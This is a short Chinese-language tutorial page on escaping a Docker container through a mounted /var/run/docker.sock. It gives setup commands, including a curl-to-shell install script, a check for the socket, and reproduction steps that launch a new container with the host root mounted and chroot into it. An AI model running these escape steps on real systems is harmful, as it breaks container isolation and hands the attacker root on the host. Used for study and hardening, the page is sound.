---
title: 挂载 Docker Socket 逃逸


---

<center><h1>挂载 Docker Socket 逃逸</h1></center>

---

Docker Socket 用来与守护进程通信即查询信息或者下发命令。

## 搭建

创建一个容器并挂载 /var/run/docker/sock 文件

```plain
docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu
```

在容器内安装 Docker 命令行客户端

```plain
docker exec -it with_docker_sock /bin/bash
apt-get update
apt-get install curl
curl -fsSL https://get.docker.com/ | sh
```

## 检测

```plain
ls -lah /var/run/docker.sock
```

如果存在这个文件，说明漏洞可能存在

## 复现

在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部

```plain
docker run -it -v /:/host ubuntu /bin/bash
```

<img width="1200" src="/img/1650014060.png">

在新的容器内执行 chroot，将根目录切换到挂载到宿主机的根目录，其实不挂载也行

```plain
chroot /host
```

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年4月15日"
    }
  }
</script>